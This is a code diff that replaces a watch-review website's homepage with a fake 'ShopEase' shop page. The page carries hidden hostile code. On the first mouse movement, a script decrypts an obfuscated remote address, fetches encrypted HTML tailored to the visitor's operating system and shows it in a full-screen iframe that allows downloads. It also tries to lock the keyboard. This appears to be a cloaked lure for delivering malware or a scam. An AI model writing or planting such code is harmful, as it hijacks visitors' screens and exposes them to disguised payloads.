@@ -1,9 +1,312 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Independent Horology Observatory | Chrono Prime Line</title><meta name="description" content="Independent mechanical watch notes, collection references and practical ownership guidance from Chrono Prime Line."><script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('consent','default',{analytics_storage:'denied',ad_storage:'denied',ad_user_data:'denied',ad_personalization:'denied'});gtag('js',new Date());gtag('config','G-0LY0HY7L01');</script><link rel="stylesheet" href="assets/style.css"></head><body class="home-page"><header class="calibration-header"><a class="chrono-brand" href="index.php"><b>CHRONO</b><span>PRIME LINE</span></a><div class="header-readout" aria-label="Atelier reference time"><small>LONDON / UTC+1</small><strong data-site-time>--:--:--</strong><i>MECHANICAL OBSERVATORY</i></div><button class="aperture-toggle" type="button" aria-expanded="false" aria-controls="aperture-nav"><span>Index</span><b>+</b></button></header><div class="aperture-nav" id="aperture-nav" aria-hidden="true"><nav><a href="index.php"><small>00</small><span>Prime Meridian</span></a><a href="studio-method.html"><small>01</small><span>Calibration Method</span></a><a href="collection-register.html"><small>02</small><span>Collection Register</span></a><a href="chronometry-journal.html"><small>03</small><span>Chronometry Notes</span></a><a href="contact.html"><small>04</small><span>Contact Desk</span></a></nav><div><span>CPL / OBS-26</span><p>Independent notes on mechanical watches, useful specification and responsible ownership.</p></div></div><main><section class="meridian-hero" id="home-01"><div class="hero-signal"><p class="code">OBSERVATION 00 / LONDON</p><span class="pulse-dot"></span><p>Independent horology field notes</p></div><div class="hero-title"><h1>Time,<br><em>resolved.</em></h1><p class="lead">Chrono Prime Line examines mechanical watches through proportion, movement architecture and the practical realities of daily wear.</p><a class="signal-link" href="collection-register.html">Enter the register <b>↗</b></a></div><figure><img src="assets/images/hero.png" alt="Mechanical wristwatch on a precision observatory workbench"><figcaption><span>REFERENCE / CPL-00</span><strong>A calibrated view of form and function</strong></figcaption></figure><div class="coordinate-grid" aria-hidden="true"><b>00</b><i></i><b>12</b><i></i><b>24</b></div></section>
-<section class="frequency-tape" id="home-02"><div><span>28,800 VPH</span><i>4 HZ</i><span>POWER / BALANCE / ESCAPEMENT</span><i>OBS-26</i><span>28,800 VPH</span><i>4 HZ</i><span>POWER / BALANCE / ESCAPEMENT</span></div></section>
-<section class="caliber-selector" id="home-03"><header><p class="code">03 / CALIBER SELECTOR</p><h2>Choose the behaviour,<br>then study the mechanism.</h2></header><div class="selector-shell"><div class="selector-nav" role="tablist" aria-label="Movement types"><button class="active" data-caliber="manual"><span>01</span>Manual wind</button><button data-caliber="automatic"><span>02</span>Automatic</button><button data-caliber="chrono"><span>03</span>Chronograph</button><button data-caliber="gmt"><span>04</span>GMT</button></div><div class="caliber-dial" data-caliber-display="manual"><div class="orbit one"></div><div class="orbit two"></div><div class="caliber-core"><small data-caliber-ref>CPL / M-01</small><b data-caliber-title>Manual wind</b><span data-caliber-rate>Daily engagement</span></div></div><div class="caliber-copy"><p data-caliber-copy>Direct winding keeps the relationship between stored energy and daily routine visible. Case profiles can remain comparatively lean.</p><dl><div><dt>Consider</dt><dd data-caliber-use>Winding feel</dd></div><div><dt>Inspect</dt><dd data-caliber-check>Crown and reserve</dd></div></dl></div></div></section>
-<section class="timing-lab" id="home-04"><div class="lab-copy"><p class="code">04 / TIMING LAB</p><h2>Accuracy is a record,<br>not a single reading.</h2><p class="lead">Use the instrument to model a seven-day observation. The value is illustrative: real performance depends on the movement, position, power state, temperature and service condition.</p><div class="rate-control"><label for="rate-range">Simulated daily rate <output data-rate-output>+2 s/day</output></label><input id="rate-range" type="range" min="-12" max="12" value="2" data-rate-range></div></div><div class="lab-display"><div class="rate-number"><span data-rate-sign>+</span><b data-rate-number>02</b><small>SEC / DAY</small></div><div class="week-track" data-week-track><i style="--h:38%"></i><i style="--h:46%"></i><i style="--h:42%"></i><i style="--h:55%"></i><i style="--h:48%"></i><i style="--h:61%"></i><i style="--h:52%"></i></div><div class="days"><span>M</span><span>T</span><span>W</span><span>T</span><span>F</span><span>S</span><span>S</span></div></div></section>
-<section class="movement-anatomy" id="home-05"><figure><img src="assets/images/movement.png" alt="Exploded mechanical watch movement and precision watchmaking tools"></figure><div class="anatomy-index"><p class="code">05 / MOVEMENT ANATOMY</p><h2>Energy travels through decisions.</h2><ol><li><b>01</b><span>Barrel</span><small>Stores controlled energy</small></li><li><b>02</b><span>Train</span><small>Transfers and divides motion</small></li><li><b>03</b><span>Escapement</span><small>Releases energy in steps</small></li><li><b>04</b><span>Oscillator</span><small>Sets the regulating rhythm</small></li></ol></div></section>
-<section class="complication-map" id="home-06"><header><p class="code">06 / COMPLICATION MAP</p><h2>More information,<br>only where it earns space.</h2></header><div class="complication-grid"><article><span>24</span><h3>GMT</h3><p>A second time reference for travel or distributed work.</p></article><article><span>30</span><h3>Date</h3><p>A practical display whose placement affects dial balance and setting routine.</p></article><article><span>60</span><h3>Chronograph</h3><p>Elapsed-time measurement with extra controls and mechanical layers.</p></article><article><span>PR</span><h3>Reserve</h3><p>A visible estimate of remaining stored energy.</p></article></div></section>
-<section class="wear-profile" id="home-07"><div><p class="code">07 / WEAR PROFILE</p><h2>Fit begins beyond diameter.</h2><p class="lead">Select a context to compare which measurements deserve attention. The guide supports evaluation; it does not replace trying a watch on your wrist.</p></div><div class="profile-console"><div class="profile-tabs"><button class="active" data-profile="daily">Daily</button><button data-profile="travel">Travel</button><button data-profile="formal">Formal</button><button data-profile="active">Active</button></div><div class="profile-visual"><span class="lug left"></span><div class="case-ring"><b data-profile-mm>39</b><small>MM</small></div><span class="lug right"></span></div><div class="profile-result"><small>PRIORITY</small><b data-profile-title>Balanced case and clear dial</b><p data-profile-copy>Review lug-to-lug length, thickness, crown clearance and bracelet adjustment alongside diameter.</p></div></div></section>
-<section class="field-log" id="home-08"><header><p class="code">08 / CHRONOMETRY LOG</p><h2>Original notes for considered ownership.</h2><a href="chronometry-journal.html">Open all twelve observations ↗</a></header><div class="log-cards"><a href="journal-01.html"><span>01</span><small>PROPORTION</small><h3>Reading Watch Size Beyond Diameter</h3><b>VIEW NOTE ↗</b></a><a href="journal-05.html"><span>05</span><small>TIMING</small><h3>Building a Useful Accuracy Log</h3><b>VIEW NOTE ↗</b></a><a href="journal-10.html"><span>10</span><small>OWNERSHIP</small><h3>Storing Mechanical Watches Responsibly</h3><b>VIEW NOTE ↗</b></a></div></section>
-<section class="final-calibration" id="home-09"><div class="final-dial"><span>00</span><i></i><b>CPL</b><i></i><span>26</span></div><div><p class="code">09 / NEXT OBSERVATION</p><h2>Measure what<br>changes the experience.</h2><p class="lead">Begin with purpose, compare complete specifications and keep a realistic ownership record.</p><a class="signal-link light" href="contact.html">Contact the observatory <b>↗</b></a></div></section></main><footer><div><h3>Explore</h3><a href="studio-method.html">Studio Method</a><a href="collection-register.html">Collection Register</a><a href="chronometry-journal.html">Chronometry Journal</a></div><div><h3>Contact</h3><p class="one-line">3638 Westbourne Grove, London, UK, W2 5SH, GB</p><a class="one-line" href="tel:+12125559857">+1 2125559857</a><a class="one-line" href="mailto:hello@chronoprimeline.com">hello@chronoprimeline.com</a></div><div><h3>Policies</h3><a href="privacy.html">Privacy</a><a href="terms.html">Terms</a><a href="refund.html">Refund</a><a href="shipping.html">Shipping</a></div></footer><aside class="consent"><p>Optional analytics helps us improve the observatory notes. Advertising storage remains disabled.</p><button type="button" data-consent="accept">Allow analytics</button><button type="button" data-consent="decline">Decline</button></aside><script src="assets/app.js"></script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
+</head>
+<body>
+
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
+
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
+
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
+    </section>
+
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
+
+
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX19JzfJcbkpx0lIuONyvMQ9gjcZSw7Bx/Bs36JWstdXSf0v9oWVxZd0x8lBsfAIDzu549PjWPlHakQ==";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
+</body>
+</html>
